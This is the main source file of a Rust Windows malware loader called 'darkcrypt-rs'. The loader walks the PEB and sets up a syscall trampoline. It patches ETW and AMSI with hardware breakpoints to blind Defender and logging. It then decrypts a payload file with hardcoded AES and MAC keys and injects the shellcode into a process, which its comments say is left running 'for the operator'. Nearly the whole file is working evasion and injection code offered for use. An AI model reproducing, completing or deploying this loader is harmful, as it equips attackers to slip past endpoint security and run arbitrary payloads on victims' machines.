// darkcrypt-rs — no_std + no_main port.
//
// Zero Rust std linkage. Alloc crate is pulled in for Vec/String/BTreeMap,
// backed by a HeapAlloc-based #[global_allocator]. All stdout is removed;
// the loader signals state via ExitProcess codes.
//
//   0           PASS, benign or combined mode completed
//   1           peb::init failed
//   2           halos::init failed
//   3           hwbp_etw::etw_patch failed
//   4           hwbp_etw::amsi_patch failed
//   5           in-process syscall smoke failed (NtAllocate/NtFree round-trip)
//   6           payload read failed (CreateFileA/ReadFile/GetFileSizeEx)
//   7           decrypt failed (DCP1 verify/unwrap)
//   8           inject failed
//   0xDEADBEEF  Rust panic reached the handler

#![no_std]
#![no_main]
#![allow(clippy::missing_safety_doc)]

extern crate alloc;

mod alloc_impl;
mod c_shims;
mod crypto;
mod encoded_strings;
mod halos;
mod hashes;
mod http;
mod hwbp_etw;
mod inject;
mod io;
mod native;
mod obfuscation;
mod panic_impl;
mod peb;
mod remote_hwbp;
mod sync;
mod syscalls;

use core::ptr;

use alloc::vec;
use alloc::vec::Vec;

use native::ExitProcess;

const AES_KEY: [u8; 32] = [
    0xe6, 0x0b, 0xf6, 0xb4, 0xd6, 0x01, 0x30, 0x6c,
    0x16, 0xcd, 0xa8, 0x33, 0xa5, 0x2d, 0x1c, 0x78,
    0x12, 0x1b, 0xa0, 0x65, 0xe4, 0xc0, 0x22, 0x96,
    0x3c, 0x8b, 0xa2, 0xbe, 0x5a, 0x0e, 0x2a, 0x59,
];

const MAC_KEY: [u8; 32] = [
    0xe6, 0x66, 0xe5, 0x37, 0x44, 0x35, 0xf2, 0xd5,
    0x29, 0xf2, 0xf5, 0x57, 0xd4, 0x03, 0x3e, 0xa3,
    0x16, 0x5c, 0xda, 0xd3, 0x29, 0xa4, 0x1b, 0xc1,
    0x30, 0xab, 0x6f, 0x2e, 0x4c, 0xb9, 0xf9, 0x7d,
];

#[no_mangle]
pub unsafe extern "C" fn mainCRTStartup() -> ! {
    let code = run();
    ExitProcess(code);
}

#[inline(never)]
unsafe fn run() -> u32 {
    // ---- bootstrap: PEB walk + DJB2 cache + Halos trampoline ----
    if peb::init().is_err()   { return 1; }
    if halos::init().is_err() { return 2; }

    // ---- loader-side HWBP ----
    if hwbp_etw::etw_patch().is_err()  { return 3; }
    if hwbp_etw::amsi_patch().is_err() { return 4; }
    // AMSI EICAR self-test — informational, non-fatal (fails cleanly on hosts
    // without Defender). Not surfaced through the exit code.
    let _ = hwbp_etw::amsi_selftest();

    // ---- regression check — alloc + free through the trampoline ----
    let mut base: native::PVOID = ptr::null_mut();
    let mut size: usize = 0x1000;
    let st = syscalls::vm_alloc(
        native::CURRENT_PROCESS, &mut base, 0, &mut size,
        native::MEM_COMMIT | native::MEM_RESERVE,
        native::PAGE_READWRITE,
    );
    if !native::nt_success(st) || base.is_null() { return 5; }
    let mut fz: usize = 0;
    let _ = syscalls::vm_free(native::CURRENT_PROCESS, &mut base, &mut fz, native::MEM_RELEASE);

    // ---- argv[1] parse ----
    let arg1 = io::argv_one();
    let combined_mode = !arg1.is_null();

    let shellcode: Vec<u8> = if combined_mode {
        let blob = match io::read_file(arg1) {
            Ok(b) => b,
            Err(_) => return 6,
        };
        match crypto::verify_and_decrypt_dcp1(&blob, &AES_KEY, &MAC_KEY) {
            Ok(pt) => pt,
            Err(_) => return 7,
        }
    } else {
        // Benign: 16-byte NOP+RET (15 NOPs + 1 RET).
        let mut sc = vec![0x90u8; 15];
        sc.push(0xC3);
        sc
    };

    if inject::inject_shellcode(&shellcode).is_err() { return 8; }

    // Benign-mode cleanup via tasklist/taskkill is gone — single-shot benign
    // injections leak a notepad on the host, which is acceptable for a smoke
    // path. Combined mode leaves the host running for the operator.
    0
}
